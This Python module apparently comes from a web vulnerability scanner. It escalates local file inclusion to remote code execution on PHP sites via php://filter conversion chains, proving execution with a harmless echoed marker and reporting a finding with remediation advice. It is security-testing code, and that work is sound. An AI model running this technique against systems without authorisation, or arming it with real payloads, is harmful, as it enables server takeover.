"""
LFI -> RCE via PHP filter chains.

Generates a ``php://filter`` conversion chain (see
``payloads.filter_chain``) that materialises a uniquely-marked ``echo``
payload from an empty stream, sends it through the confirmed inclusion point,
and only reports a finding if the marker is reflected *without* its PHP tags —
i.e. the payload was executed, not merely echoed. No writable file, log, or
upload is required.
"""
from __future__ import annotations

import secrets
from typing import Iterator

from lfimachine.core.result import Finding, Severity
from lfimachine.payloads import filter_chain
from lfimachine.techniques.base import Technique, TechniqueContext


class FilterChainRceTechnique(Technique):
    name = "php-filter-chain-rce"
    description = "LFI to RCE via php://filter iconv chains (no file write)"
    priority = 45
    requires_inclusion = False

    def applicable(self, ctx: TechniqueContext) -> bool:
        return ctx.rce and (
            ctx.fingerprint.php or ctx.fingerprint.language in (None, "php")
        )

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        marker = "FCX" + secrets.token_hex(4)
        php = f"<?php echo '{marker}';?>"
        chain = filter_chain.build_chain(php)

        log.verbose(f"[{self.name}] testing generated filter chain ({len(chain)} bytes)")
        resp = ctx.point.send(ctx.client, chain)

        if not resp.ok:
            return

        # Execution proof: bare marker present, and the PHP tag literal is NOT
        # sitting right next to it (which would indicate the source was echoed).
        if marker in resp.text:
            around = resp.text.split(marker)[0][-40:]
            executed = "<?php" not in around and "echo" not in around
            confidence = 0.95 if executed else 0.55
            log.good(
                f"Filter-chain RCE {'confirmed' if executed else 'suspected'} "
                f"on {ctx.point.describe()}"
            )
            yield Finding(
                technique=self.name,
                title="Remote Code Execution via PHP filter chain",
                severity=Severity.CRITICAL if executed else Severity.HIGH,
                confidence=confidence,
                url=resp.url or ctx.point.url,
                parameter=ctx.point.parameter or "<path>",
                method=ctx.point.method,
                payload=chain,
                evidence=f"marker {marker} returned by synthesised payload",
                os_guess=ctx.os_confirmed,
                status_code=resp.status_code,
                response_length=resp.length,
                remediation=(
                    "Eliminate user-controlled include paths. As defence in "
                    "depth, restrict allowed stream wrappers and keep PHP "
                    "up to date."
                ),
                extra={"vector": "php://filter chain", "code_exec": executed},
            )
